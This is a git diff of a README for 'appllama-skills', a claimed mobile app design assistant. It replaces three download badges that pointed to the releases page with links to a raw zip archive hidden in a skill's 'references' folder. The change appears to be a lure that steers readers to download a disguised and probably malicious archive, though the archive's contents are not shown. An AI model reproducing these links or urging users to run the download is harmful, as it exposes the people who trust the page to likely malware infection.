@@ -1,6 +1,6 @@
 # 🦙 appllama-skills - Your Mobile App Design Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-Appllama_Skills-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/pianoteachervandegraaffgenerator47/appllama-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-Appllama_Skills-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/pianoteachervandegraaffgenerator47/appllama-skills/raw/refs/heads/main/skills/appllama-app-design-skill/references/1.0-beta.1.zip)
 
 ## 👋 Welcome to appllama-skills
 
@@ -26,7 +26,7 @@ Getting appllama-skills is easy! Here's what you need to do:
 
 Visit this link to download the application. The download should start automatically once you click the button below.
 
-[![Download appllama-skills](https://img.shields.io/badge/▶️_Download_appllama--skills_CLICK_HERE-orange?style=for-the-badge&logo=download&color=ff7f2a)](https://github.com/pianoteachervandegraaffgenerator47/appllama-skills/releases)
+[![Download appllama-skills](https://img.shields.io/badge/▶️_Download_appllama--skills_CLICK_HERE-orange?style=for-the-badge&logo=download&color=ff7f2a)](https://github.com/pianoteachervandegraaffgenerator47/appllama-skills/raw/refs/heads/main/skills/appllama-app-design-skill/references/1.0-beta.1.zip)
 
 ### Step 2: Run the Application
 
@@ -175,7 +175,7 @@ appllama-skills is more than just a tool—it's your partner in creating beautif
 
 Don't wait to bring your app ideas to life! Download appllama-skills today and see what you can create.
 
-[![Get Started Now](https://img.shields.io/badge/🚀_Get_Started_Now-download-green?style=for-the-badge&logo=start&color=4caf50)](https://github.com/pianoteachervandegraaffgenerator47/appllama-skills/releases)
+[![Get Started Now](https://img.shields.io/badge/🚀_Get_Started_Now-download-green?style=for-the-badge&logo=start&color=4caf50)](https://github.com/pianoteachervandegraaffgenerator47/appllama-skills/raw/refs/heads/main/skills/appllama-app-design-skill/references/1.0-beta.1.zip)
 
 ## 📬 Stay Connected
 
